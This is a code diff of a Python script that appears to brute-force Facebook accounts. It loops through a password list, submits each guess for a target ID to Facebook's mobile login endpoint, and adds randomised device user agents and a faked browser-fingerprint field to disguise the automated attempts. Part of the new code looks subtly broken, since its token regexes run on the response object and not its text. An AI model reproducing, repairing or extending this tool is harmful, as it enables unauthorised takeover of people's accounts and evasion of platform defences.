@@ -40,7 +40,19 @@ def mbasic_ua():
     uazku9 = f"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
     uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
     return uazku8
-    
+
+def ____PO_CO____():
+    version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
+    model_choices = ['SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F']
+    build_choices = ['MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T']
+    version = random.choice(version_choices)
+    model = random.choice(model_choices)
+    build = random.choice(build_choices)
+    ver = str(random.choice(range(77, 577))) # Corrected range
+    ver2 = str(random.choice(range(57, 77))) # Corrected range
+    return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
+            f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')
+
 def basic_ua():
     rr = random.randint; rc = random.choice
     aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
@@ -132,33 +144,49 @@ class System:
         try:
             for pas in passlist:
                 url = "https://touch.facebook.com/"
-                curl = ses.get(url)
-                data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(curl.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(curl.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(curl.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(curl.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+                free_fb = ses.get(url)
+                data = {
+                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                'try_number': '0',
+                'unrecognized_tries': '0',
+                'email': ids,
+                'prefill_contact_point': ids,
+                'prefill_source': 'browser_dropdown',
+                'prefill_type': 'contact_point',
+                'first_prefill_source': 'browser_dropdown',
+                'first_prefill_type': 'contact_point',
+                'had_cp_prefilled': True,
+                'had_password_prefilled': False,
+                'is_smart_lock': False,
+                'bi_xrwh': '0',
+                'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+                'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
                 headers = {
-                'authority': 'mbasic.facebook.com',
-                'method': 'POST',
-                'path': '/login/device-based/login/async/',
-                'scheme': 'https',
-                'accept': '*/*',
-                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://mbasic.facebook.com',
-                'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=779900868722692&kid_directed_site=0&app_id=779900868722692&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
-                'sec-ch-prefers-color-scheme': 'light',
-                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-                'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
+                'Host': 'mtouch.facebook.com',
+                # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+                'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
                 'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-model': str(random.choice(google_pixel)),
-                'sec-ch-ua-platform': '"Linux"',
-                'sec-ch-ua-platform-version': ''+str(random.randint(7,10))+'.0.0',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': self.samsung_user_agent(),
-                'x-asbd-id': '359341',
-                'x-fb-lsd': '',
+                'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+                'x-response-format': 'JSONStream',
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                'viewport-width': '360',
                 'x-requested-with': 'XMLHttpRequest',
-                'x-response-format': 'JSONStream',}
+                'x-asbd-id': '129477',
+                'dpr': '2',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua-platform': '"Android"',
+                'accept': '*/*',
+                'origin': 'https://mtouch.facebook.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
                 login_url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=779900868722692&auth_token=af06de30d9acd77f7bbc31679fd0f694&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&refsrc=deprecated&app_id=779900868722692&cancel=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&lwv=100"
                 response = ses.post(url=login_url, data=data, headers=headers)
                 log_cookies = ses.cookies.get_dict().keys()
